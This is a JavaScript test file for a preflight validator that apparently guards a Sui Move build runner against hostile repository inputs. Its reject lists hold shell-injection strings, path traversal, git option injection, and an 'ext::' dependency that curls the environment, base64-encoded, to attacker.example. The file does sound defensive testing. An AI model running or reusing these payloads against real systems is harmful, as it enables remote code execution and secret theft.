// Built-by: @projectx.sui /|\ · Co-authored-by: Kaela
//
// The values a stranger's repository gets to choose, and what we do with them.
//
// Two of these tests describe live defects in the shape this runner had before key
// distance: a `package` path that walks upwards or carries a shell metacharacter used to
// be interpolated straight into a bash command line, and a `git = "ext::…"` dependency
// used to be handed to `sui move build`, which hands it to git, which runs it as a shell
// command. Both are now refused before anything executes.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  validateRepository, validateSha, validatePackagePath,
  parseMoveDependencies, dependencyPolicy, resolveLocalDep,
} from '../lib/preflight.mjs';

test('repository must be owner/name and nothing else', () => {
  assert.equal(validateRepository('Northlatch-Labs-LLC/weir').ok, true);
  assert.equal(validateRepository('owner/name.with.dots').ok, true);
  for (const bad of [
    '', 'noslash', 'a/b/c', '/leading', 'trailing/', 'own er/name',
    'owner/name;rm -rf /', 'owner/$(id)', '-flag/name', 'owner/name\nsecond',
  ]) {
    assert.equal(validateRepository(bad).ok, false, `should reject ${JSON.stringify(bad)}`);
  }
});

test('head sha must be a 40-character lowercase hex commit id', () => {
  assert.equal(validateSha('a'.repeat(40)).ok, true);
  for (const bad of ['', 'A'.repeat(40), 'a'.repeat(39), 'a'.repeat(41), 'HEAD', `${'a'.repeat(40)};id`]) {
    assert.equal(validateSha(bad).ok, false, `should reject ${JSON.stringify(bad)}`);
  }
});

test('the package path is an allowlist, because it reaches bash', () => {
  for (const good of ['sui-contracts', 'packages/core', 'a/b/c-d_e.f', '.hidden-pkg', '.']) {
    assert.equal(validatePackagePath(good).ok, true, `should accept ${good}`);
  }
  // "." is a whole-value allowance for root packages, never a segment allowance —
  // 'a/./b' stays in the reject list below.
  assert.equal(validatePackagePath('.').value, '.');
  for (const bad of [
    '', '/etc', '../../etc', 'a/../../b', 'a/./b', 'a//b', 'pkg/',
    'pkg; curl evil.sh | sh', 'pkg$(id)', 'pkg`id`', 'pkg with space',
    'pkg\nsecond', 'pkg"quote', "pkg'quote", 'pkg\\back', '-rf', 'a'.repeat(201),
  ]) {
    assert.equal(validatePackagePath(bad).ok, false, `should reject ${JSON.stringify(bad)}`);
  }
});

test('Move.toml dependencies parse in both shapes', () => {
  const toml = `
[package]
name = "demo"

[dependencies]
Sui = { git = "https://github.com/MystenLabs/sui.git", subdir = "crates/sui-framework/packages/sui-framework", rev = "framework/mainnet" }
Local = { local = "../libs/math" }
# Commented = { git = "https://example.com/nope.git" }

[dependencies.Pinned]
git = "https://github.com/example/dep.git"
rev = "0123456789abcdef0123456789abcdef01234567"

[dev-dependencies]
Harness = { local = "./harness" }
`;
  const deps = parseMoveDependencies(toml);
  const byName = Object.fromEntries(deps.map((d) => [d.name, d]));
  assert.deepEqual(Object.keys(byName).sort(), ['Harness', 'Local', 'Pinned', 'Sui']);
  assert.equal(byName.Sui.kind, 'git');
  assert.equal(byName.Sui.rev, 'framework/mainnet');
  assert.equal(byName.Sui.subdir, 'crates/sui-framework/packages/sui-framework');
  assert.equal(byName.Local.kind, 'local');
  assert.equal(byName.Local.local, '../libs/math');
  assert.equal(byName.Pinned.rev, '0123456789abcdef0123456789abcdef01234567');
  assert.equal(deps.some((d) => d.name === 'Commented'), false, 'a commented-out dependency is not a dependency');
});

test('git transports other than https are refused — ext:: is remote code execution', () => {
  const hostile = `
[dependencies]
Evil = { git = "ext::sh -c 'curl https://attacker.example/$(cat /proc/self/environ|base64)'" }
`;
  const { refusals } = dependencyPolicy(parseMoveDependencies(hostile));
  assert.equal(refusals.length, 1);
  assert.match(refusals[0], /not a plain https:\/\/ URL/);
});

test('file:, git:, ssh: and scp-style sources are refused too', () => {
  for (const url of [
    'file:///home/runner/work',
    'git://example.com/repo.git',
    'ssh://git@example.com/repo.git',
    'git@github.com:owner/repo.git',
    'https://example.com/repo.git; id',
    '--upload-pack=id',
    'http://example.com/repo.git',
  ]) {
    const toml = `[dependencies]\nD = { git = "${url}" }\n`;
    const { refusals } = dependencyPolicy(parseMoveDependencies(toml));
    assert.equal(refusals.length, 1, `should refuse ${url}`);
  }
});

test('a rev that could be read as a git option is refused', () => {
  const toml = '[dependencies]\nD = { git = "https://github.com/o/r.git", rev = "--upload-pack=id" }\n';
  const { refusals } = dependencyPolicy(parseMoveDependencies(toml));
  assert.equal(refusals.length, 1);
  assert.match(refusals[0], /not valid in a git ref/);
});

test('an https dependency on a branch is recorded, not refused', () => {
  // The Sui framework's own published guidance pins to `framework/mainnet`, a branch.
  // Refusing that would break every honest Move package on earth to no security gain,
  // so it is a recorded fact about reproducibility, not a gate.
  const toml = '[dependencies]\nSui = { git = "https://github.com/MystenLabs/sui.git", rev = "framework/mainnet" }\n';
  const { refusals, notes } = dependencyPolicy(parseMoveDependencies(toml));
  assert.deepEqual(refusals, []);
  assert.equal(notes.length, 1);
  assert.match(notes[0], /branch or tag, not a commit id/);
});

test('an https dependency pinned to a commit is clean', () => {
  const toml = `[dependencies]\nD = { git = "https://github.com/o/r.git", rev = "${'a'.repeat(40)}" }\n`;
  const { refusals, notes } = dependencyPolicy(parseMoveDependencies(toml));
  assert.deepEqual(refusals, []);
  assert.deepEqual(notes, []);
});

test('a local dependency may not escape the repository', () => {
  assert.equal(resolveLocalDep('pkg', '../libs'), 'libs');
  assert.equal(resolveLocalDep('pkg', './sub'), 'pkg/sub');
  assert.equal(resolveLocalDep('pkg', '../../outside'), null);
  assert.equal(resolveLocalDep('', '..'), null);

  const toml = '[dependencies]\nUp = { local = "../../../../etc" }\n';
  const { refusals } = dependencyPolicy(parseMoveDependencies(toml), 'pkg');
  assert.equal(refusals.length, 1);
  assert.match(refusals[0], /resolves outside the repository/);

  const abs = '[dependencies]\nAbs = { local = "/home/runner/work" }\n';
  assert.equal(dependencyPolicy(parseMoveDependencies(abs), 'pkg').refusals.length, 1);
});

test('a local dependency inside the repository is clean', () => {
  const toml = '[dependencies]\nMath = { local = "../libs/math" }\n';
  const { refusals, notes } = dependencyPolicy(parseMoveDependencies(toml), 'packages/core');
  assert.deepEqual(refusals, []);
  assert.deepEqual(notes, []);
});
